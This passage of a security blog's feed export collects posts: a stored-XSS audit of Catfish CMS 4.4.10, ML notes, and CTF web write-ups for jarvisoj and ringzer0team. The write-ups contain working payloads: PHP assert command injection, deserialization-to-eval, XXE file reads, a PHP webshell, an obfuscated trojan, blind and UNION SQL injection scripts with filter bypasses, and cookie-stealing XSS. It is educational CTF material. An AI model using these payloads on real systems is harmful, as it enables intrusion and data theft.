      <url>%2F2017%2F07%2F11%2FCatfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[Catfish(鲶鱼) CMS V 4.4.10 ：http://www.catfish-cms.com/ 审计在...\application\index\controller\Index.php中，定义了评论功能。代码如下；1234567891011//添加评论$data = [ 'post_id' =&gt; Request::instance()-&gt;post('id'), 'url' =&gt; 'index/Index/article/id/'.Request::instance()-&gt;post('id'), 'uid' =&gt; Session::get($this-&gt;session_prefix.'user_id'), 'to_uid' =&gt; $beipinglunren['post_author'], 'createtime' =&gt; date("Y-m-d H:i:s"), 'content' =&gt; $this-&gt;filterJs(Request::instance()-&gt;post('pinglun')), 'status' =&gt; $plzt];Db::name('comments')-&gt;insert($data); 评论内容content在经过函数filterJs过滤后插入到数据库中。 filterJs定义在...\application\index\controller\Common.php中1234protected function filterJs($str)&#123; return preg_replace(['/&lt;script[\s\S]*?&lt;\/script&gt;/i','/&lt;style[\s\S]*?&lt;\/style&gt;/i'],'',$str);&#125; 仅做了简单的过滤，只要构造下列payload就可绕过:1&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt; filterJs会把&lt;script&gt;**&lt;/script&gt;替换为空，从而使插入到数据库中的数据变为：1&lt;script&gt;alert(document.cookie)&lt;/script&gt;替换为空 验证以普通账户user登陆，并对文章进行评论 因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload admin登陆后台，触发XSS： 查看源代码：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[渗透测试(1)信息搜集]]></title>
      <url>%2F2017%2F07%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
      <content type="text"><![CDATA[未完 域名域名注册人等whois利用whois，可以查询域名的相关详细信息。包括域名所有人，域名注册日期，联系方式，邮箱等等。在社会工程学、以及后期的渗透中起到很大的作用。 http://whois.chinaz.com/ l 子域名爆破域传送漏洞工具CDN绕过搜索引擎高级搜索技巧网络组件搜索IPC段IP同服站点特殊信息泄露 github Reference 本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇） 子域名的艺术 【渗透神器系列】搜索引擎 域渗透基础简单信息收集（基础篇） 内网渗透定位技术总结 后渗透攻防的信息收集 安全攻城师系列文章－敏感信息收集 子域名枚举的艺术 论二级域名收集的各种姿势 我眼中的渗透测试信息搜集 大型目标渗透－01入侵信息搜集]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：感知机(perceptron)]]></title>
      <url>%2F2017%2F07%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron%2F</url>
      <content type="text"><![CDATA[机器学习算法:感知机(perceptron) 定义学习策略造轮子原始形式1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport numpy as npf1 = plt.figure(1)data_set = np.array([[3,3,1],[4,3,1],[1,1,-1],[2,4,1],[0,0,-1],[2,0,-1],[6,1,-1]])plt.scatter(data_set[np.where(data_set[:,2] == 1)][:,0],data_set[np.where(data_set[:,2] == 1)][:,1],marker = 'x', color = 'm')plt.scatter(data_set[np.where(data_set[:,2] == -1)][:,0],data_set[np.where(data_set[:,2] == -1)][:,1],marker = 'o', color = 'g')length = len(data_set)rate = 1w = np.array([0,0])b = 0flag = Truex = np.linspace(-1,5,10)while flag == True : flag = False for i in range(length) : if ( data_set[i][2] * (w.dot(data_set[i,0:2]) + b )) &lt;= 0 : w = w + rate * data_set[i][2] * data_set[i,0:2] b = b + rate * data_set[i][2] flag = True print(w,b)plt.plot(x,(-b - w[0] * x) / w[1],'r')plt.show()print(w,b) 输出结果：12345678910111213141516171819[3 3] 1[2 2] 0[2 2] -1[0 2] -2[-6 1] -3[-3 4] -2[1 7] -1[0 6] -2[-6 5] -3[-3 8] -2[-4 7] -3[-5 6] -4[-2 9] -3[-3 8] -4[-4 7] -5[ 0 10] -4[-1 9] -5[-2 8] -6[-3 7] -7 对偶形式]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tensorflow学习：常用API]]></title>
      <url>%2F2017%2F07%2F06%2FTensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API%2F</url>
      <content type="text"><![CDATA[记录学习Tensorflow的一些东西。本文同步发表于电子书The Path to Machine Learning。将会持续保持更新。 常用Math操作tf.random_normal()作用输出满足正态分布的随机值 说明12345678random_normal( shape, mean=0.0, stddev=1.0, dtype=tf.float32, seed=None, name=None) shape:一维整数张量/python数组，表示输出的张量的形状。 mean：类型为dtype的零维张量/python值。平均值。 stddev：类型为dtype的零维张量/python值。标准差。 dtype：输出数据的类型。 seed：用于作为生成随机数的种子。 name：为操作起个名字（可选） tf.zeros()作用创建一个所有元素都为零的张量。 说明12345zeros( shape, dtype=tf.float32, name=None) shape: 一维整数张量/python数组 name: 为操作起个名字（可选） dtype: 输出数据的类型 tf.global_variables_initializer()作用返回一个初始化全局变量的操作（op）是variable_initializer(global_variables())的缩写。 tf.square作用计算平方 说明1234square( x, name=None) tf.reduce_mean作用计算张量某一维度上的平均值 说明1234567reduce_mean( input_tensor, axis=None, keep_dims=False, name=None, reduction_indices=None) input_tensor:输入一个张量 axis:指定某一个维度。比如test = [[[1.0,2],[3,4]],[[5,6],[6,7]]]，则可选值为0，1，2 keep_dims：输出是否保持原来的维度。 name：给操作起个名字 reduction_indices：axis的旧名字，不赞成用，可忽略。 常用Optimizer类tf.train.GradientDescentOptimizer()123learning_rate: A Tensor or a floating point value. The learning rate to use.use_locking: If True use locks for update operations.name: Optional name prefix for the operations created when applying gradients. Defaults to &quot;GradientDescent&quot;.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jarvisoj-web-writeup]]></title>
      <url>%2F2017%2F07%2F05%2Fjarvisoj-web-writeup%2F</url>
      <content type="text"><![CDATA[jarvisoj-web-writeup [61dctf]babyphp以前做过。按理说应该有git泄露的..这次死活找不到：）更新：平台给了hint说题目已经修复了，找到了：）通过git泄露出来的index.php源码如下：1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 其中assert是个危险函数，其原型为1bool assert ( mixed $assertion [, string $description ] ) 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。payload1：1http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos; payload21http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos; 得到flag:161dctf&#123;8e_careful_when_us1ng_ass4rt&#125; 其实这是CSAW2016原题.. [61dctf]inject12http://web.jarvisoj.com:32794/Hint1: 先找到源码再说吧~~ 访问：http://web.jarvisoj.com:32794/index.php~，得到源代码：123456789&lt;?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";$table = Filter($table);mysqli_query($mysqli,"desc `secret_&#123;$table&#125;`") or Hacker();$sql = "select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;";$ret = sql_query($sql);echo $ret[0];?&gt; [61dctf]admin扫到robots.txt发现Disallow: /admin_s3cr3t.php。访问并用burp抓包，如下： 在cookie字段加上admin=1，得到flag：1flag&#123;hello_admin~&#125; WEB?有一个check功能，输入错误的密码会提示“Wrong Password!!”，查看源代码，有个app.js。将该js文件格式化后在里面查找字符串“Wrong Password!!”，如下： 可以看到有个checkpass(e)函数，定位到该函数处。 1234r.checkpass = function() &#123; var e; return (e = r).__checkpass__REACT_HOT_LOADER__.apply(e, arguments) &#125;, 定位到 checkpassREACTHOTLOADER 处： 发现是一个线性方程组。123456789101112import numpy as npfrom scipy.linalg import solveimport stringr = np.array([325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259])o = np.array([[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]])x = solve(o,r)flag = ""for i in range(len(x)): char = chr(int(round((x[i])))) flag += charprint(flag) 得到flag：1QWB&#123;R3ac7_1s_interesting&#125; PHPINFO题目入口：http://web.jarvisoj.com:32784/题目源码：1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; session.serialize_handler容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。 由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。可以看看这里：有趣的php反序列化总结 先把下面代码保存为test.html。12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 接下来考虑序列化的问题。1234567891011&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();&lt;?phpclass OowoO&#123; public $mdzz='xxxxx';&#125;$obj = new OowoO();echo serialize($obj);?&gt; payloay1:将xxxxx替换为print_r(scandir(dirname(__FILE__)));,得到序列化结果：1O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125; 为防止转义，在引号前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125; 注意，前面有一个|，这是session的格式。 接下来就是去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php由phpinfo可知当前的路径为/opt/lampp/htdocs/ 将xxx处改为：1print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;)); 之后步骤如前，将filename改为：1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125; 得到flag：1CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125; api调用在《小试XML实体注入攻击》中已经提过。 抓包改包，将Content-Type改为application/xml，然后post数据如下：123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 得到flag：1CTF&#123;XxE_15_n0T_S7range_Enough&#125; Easy Gallery随手测试一下功能，比如点开submit，或者view页面，他们的链接如下：12http://web.jarvisoj.com:32785/index.php?page=submithttp://web.jarvisoj.com:32785/index.php?page=submit 随便改个参数：1http://web.jarvisoj.com:32785/index.php?page=view%27 结果报错：12Warning: fopen(view&apos;.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24No such file! 所以这里应该有文件包含漏洞。结合submit的图片上传功能，可以猜想我们上传一个图片马，然后再去包含它。用edjpgcom制作图片，插入的一句话为：1&lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;c&apos;]);&lt;/script&gt; 若是直接用&lt;?php … ?&gt;，会失败，应该是服务器端做了过滤。上传后得到id。之后通过view功能得到图片的地址为1http://web.jarvisoj.com:32785/uploads/1499355842.jpg 利用文件包含功能，加上%00截断绕过，访问：12http://web.jarvisoj.com:32785/index.php?page=uploads/1499355842.jpg%00 得到flag：1CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125; Simple Injection盲注。用户名处存在注入。根据是用户名错误还是密码错误来进行判断。过滤了空格，and，or。 过滤空格，可以用tab键绕过 %09 过滤or，可以用||来替代 附上exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://web.jarvisoj.com:32787/login.php" # parm = &#123;"username":payload,"password":"bb","submit":""&#125; headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "username="+payload+"&amp;password=bb" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.text# def generatePayload():cuowu = '\u7528\u6237\u540d\u9519\u8bef'.decode('unicode_escape')# print cuowudef generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x696e6a656374696f6e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x61646d696e)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(id,0x3a,username,0x3a,password%09SEPARATOR%090x3c62723e)%09FROM%09admin)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "a' || (ascii(substr("+generateTarget(target) +","+ str(i) +",1))&lt;="+str(midNum) +")%23" # print payload recv = sendPayload(payload) # print recv if cuowu in recv: # print 'cuowu' # raw_input() doubleSearch(midNum,rightNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 密码进行md5解密：1334cfb59c9d74849801d5acdcfdaadc3 =&gt; eTAloCrEP 最后flag：1CTF&#123;s1mpl3_1nJ3ction_very_easy!!&#125; Chopper题目地址：http://web.jarvisoj.com:32782/题目描述：小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？ 查看源代码，图片的插入方式比较奇怪，如下：1http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg 点击管理员登陆1http://web.jarvisoj.com:32782/admin 查看源代码得到提示：1&lt;!--&lt;script&gt;alert(&apos;admin ip is 103.27.76.153&apos;)&lt;/script&gt;--&gt; 结合前面图片的插入方式，我们构造下面链接访问：1http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/ 通过扫描器知admin目录下有robots.txt，内容如下：123User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt 其中trojan.php.txt的内容是：1&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; 上述代码保存为php页面运行一下，得到Warning：1Warning: assert() [function.assert]: Assertion &quot;eval($_POST[360])&quot; failed in C:\phpstudy\WWW\b.php on line 1 所以，webshell密码为360。 最后flag：1CTF&#123;fl4g_1s_my_c40d40_1s_n0t_y0urs&#125; RE?题目如下1咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦 下载下来后文件名为udf.so.XXXXX，用mysql导入一下。具体过程如下。将udf文件放到/usr/lib/mysql/plugin/文件夹中：1root@0e5b63de05fd:/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172 登陆mysql后，加载help_me函数：12mysql&gt; create function help_me returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;Query OK, 0 rows affected (2.04 sec) 利用help_me函数：12345678mysql&gt; select help_me();+---------------------------------------------+| help_me() |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.17 sec) 利用udf再创建一个getflag函数。12mysql&gt; create function getflag returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;Query OK, 0 rows affected (0.05 sec) 得到flag：12345678mysql&gt; select getflag();+------------------------------------------+| getflag() |+------------------------------------------+| PCTF&#123;Interesting_U5er_d3fined_Function&#125; |+------------------------------------------+1 row in set (0.00 sec) IN A mess题目地址：http://web.jarvisoj.com:32780/index.php?id=1 访问并查看源代码，发现提示：1&lt;!--index.phps--&gt;work harder!harder!harder 访问index.phps，得到源码：123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; php弱类型绕过。当$a为php://input，$data可以通过php://input来接受post数据。$id传一个字符进去，会被转换为0。对$b，要求长度大于5，其次要求满足eregi的要求和首字母不为4。可以设置$b为%00111111，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。 访问：1http://web.jarvisoj.com:32780/^HT2mCpcvOLf 发现链接自动补全，如下：1http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1 猜测是注入。注入过程如下：1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,3# 字段数为3。 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,database()# 得到数据库名:test 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374# 得到表名：content 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74# 得到字段名：id,context,title 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,0x3a,context,0x3a,title,0x3a)/*123*/frfromom/*111*/content# 得到flag：1PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; 神盾局的秘密打开页面后查看源代码，发现插入图片的位置处是base64加密结果。1&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; 将index.php经base64加密后得到aW5kZXgucGhw尝试访问：1http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 得到index.php源码：123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 看到里面有个shield.php，尝试用前面的套路去读取：12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 用以下脚本生成序列化串O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}：1234567&lt;?php class Shield &#123; public $file = &quot;pctf.php&quot;; &#125; $chybeta = new Shield(); print_r(serialize($chybeta));?&gt; 访问1http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; 查看源代码，得到flag：1PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125; 顺便附上showimg.php的源码：123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; Login随便填一个密码。抓包得到提示： 要注入下列sql语句：1&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot; 关键在md5($pass,true)，若$pass的值为ffifdyop，则经过md5转换后的值再经过php转为字符串后会变成&#39;or&#39;6蒥欓!r,b，6的后面是一堆乱七八糟的字符，姑且记为xx吧。则最后的sql查询语句为：1select * from `admin` where password=&apos;&apos;or&apos;6蒥欓!r,b&apos; 成功闭合前面的单引号。填入password，得到flag：1PCTF&#123;R4w_md5_is_d4ng3rous&#125; 更多内容可见：SQL injection with raw MD5 hashes LOCALHOST直接改X-Forwarded-For为127.0.0.1。得到flag:1PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; PORT 51用vps来请求，不然经过路由后可能请求端口就变了。在vps上：123456789101112131415161718ubuntu@VM-207-93-ubuntu:~$ sudo curl --local-port 51 http://web.jarvisoj.com:32770/[sudo] password for ubuntu:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 100&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; flag：1PCTF&#123;M45t3r_oF_CuRl&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-web-writeup]]></title>
      <url>%2F2017%2F07%2F05%2F%C2%96ringzer0team-web-writeup%2F</url>
      <content type="text"><![CDATA[ringzer0team-web Big Brother is watching题目地址： https://ringzer0team.com/challenges/212 题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/ 访问 https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/ 得到flag；1FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i Looking for password file题目地址：http://ringzer0team.com:1008/?page=lorem.php 读取password，猜测是passwd文件。访问：http://ringzer0team.com:1008/?page=/etc/passwd 得到flag:1FLAG-zH9g1934v774Y7Zx5s16t5ym8Z Area 51题目地址：https://ringzer0team.com/challenges/48 题目提示：Access to this area is restricted using some secure .htaccess .htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：1FLAG-w4KRr557y626izv567758O52 Headache题目提示：Answer is closer than you think! head，所以我们抓包看头部。得到flag：1FLAG-365m4fU5p2DVEQbfrptDE5Ru] Words mean something?给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现flag：0。修改后发包得到flag： flag:1FLAG-AnlAb6QxDpQvg1yn2bAhyOJw Admin Panel有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下： 将方法改成GET请求，在尾部添加：?showflagforme=yesIwantafla。见下： 得到flag：1FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS Captcha I题目地址：http://captcha.ringzer0team.com:7421/form1.php测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：1234567891011&lt;script&gt;function doIt()&#123; var A = document.getElementById('captcha-form').value; if (A == "ehage")&#123; document.forms["Form1"].submit(); &#125; else &#123; alert("BAD Captcha"); &#125;&#125;&lt;/script&gt; 其中if判断条件里的ehage就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：123456789101112131415import requestscookie = &#123;'_ga':'GA1.2.1373385590.1498799275','_gid':'GA1.2.867459789.1498799275','_gat':'1','PHPSESSID':'1kr76vh1164sbgeflnngimi321'&#125;url 